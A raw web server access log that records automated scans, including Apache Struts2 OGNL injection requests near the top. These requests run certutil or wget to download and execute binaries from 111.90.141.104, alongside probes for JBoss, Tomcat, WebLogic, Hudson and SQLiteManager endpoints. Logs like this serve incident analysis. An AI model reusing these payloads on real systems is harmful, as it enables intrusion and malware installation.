178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "POST / HTTP/1.1" 405 584 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "POST / HTTP/1.1" 405 584 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.141.104/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 152 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.141.104/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 152 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27nohup%20uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.141.104/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.141.104/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%20%26%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 152 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27nohup%20uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.141.104/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.141.104/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%20%26%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 152 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /invoker/readonly HTTP/1.1" 404 178 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 178 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /jmx-console/HtmlAdaptor HTTP/1.1" 404 178 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /orders.xhtml HTTP/1.1" 404 178 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET / HTTP/1.1" 200 11321 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /users HTTP/1.1" 404 178 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "PUT /dbk_put1.jsp/ HTTP/1.1" 404 178 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /dbk_put1.jsp HTTP/1.1" 404 178 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /manager/html HTTP/1.1" 404 178 "-" "-"
178.128.123.6 - - [04/Jan/2019:16:27:14 +0800] "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 178 "-" "-"
178.165.70.124 - - [04/Jan/2019:18:24:55 +0800] "GET / HTTP/1.1" 200 3602 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:24:56 +0800] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:00 +0800] "GET /HNAP1/ HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:01 +0800] "GET /hudson/script HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:02 +0800] "GET /script HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:02 +0800] "GET /sqlite/main.php HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:03 +0800] "GET /sqlitemanager/main.php HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:04 +0800] "GET /SQLiteManager/main.php HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:05 +0800] "GET /SQLite/main.php HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:15 +0800] "GET /SQlite/main.php HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:16 +0800] "GET /main.php HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:17 +0800] "GET /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:18 +0800] "GET /SQLiteManager-1.2.4/main.php HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.165.70.124 - - [04/Jan/2019:18:25:18 +0800] "GET /agSearch/SQlite/main.php HTTP/1.1" 404 152 "http://178.128.48.27/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
198.167.223.52 - - [04/Jan/2019:19:05:14 +0800] "GET /acadmin.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
193.150.117.31 - - [04/Jan/2019:19:47:00 +0800] "GET / HTTP/1.1" 200 11321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
14.102.117.75 - - [04/Jan/2019:20:08:04 +0800] "GET / HTTP/1.1" 200 11321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
2.182.17.65 - - [04/Jan/2019:21:21:39 +0800] "GET / HTTP/1.1" 200 11321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
